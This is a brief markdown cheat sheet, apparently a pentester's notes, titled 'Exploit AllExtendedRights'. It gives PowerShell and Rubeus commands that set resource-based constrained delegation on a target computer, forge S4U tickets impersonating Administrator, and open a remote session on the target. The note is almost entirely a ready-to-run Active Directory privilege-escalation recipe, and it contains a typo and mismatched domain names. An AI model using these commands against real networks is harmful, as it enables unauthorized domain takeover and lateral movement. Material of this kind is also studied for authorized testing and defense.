# Exploit AllExtendedRights

## User -(AllExtendedRights)->  Machine2Machine

when user have some AllExtendedRights right to some machine (targetPC).

Require Owned One machine, add machine to target machine.

add PrincipalsAllowedToDelegateToAccount right.


### Using AllExtendedRights add target PC

```powershell
PS C:\mane> . .\Import-ActiveDirectory.ps1
PS C:\mane> Import-ActiveDirectory 
PS C:\mane> set-adcomputer targetPC -PrincipalsAllowedToDelegateToAccount (get-adcomputer sourcePC)
```

### Exploit

```powershell
PS C:\mane> .\Rubeus.exe tgtdeleg /nowrap 

PS C:\mane> .\Rubeus.exe s4u /user:sourcrPC$ /ticket:xxxxxx /impersonateuser:Administrator /msdsspn:cifs/targetPC$.CORE.CYBER.LOCAL /altservice:termsrv,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt /nowrap 

PS C:\mane> $s = New-PSSession -ComputerName "targetPC.manesec.com"
PS C:\mane> Invoke-Command -Session $s -ScriptBlock { whoami }

```


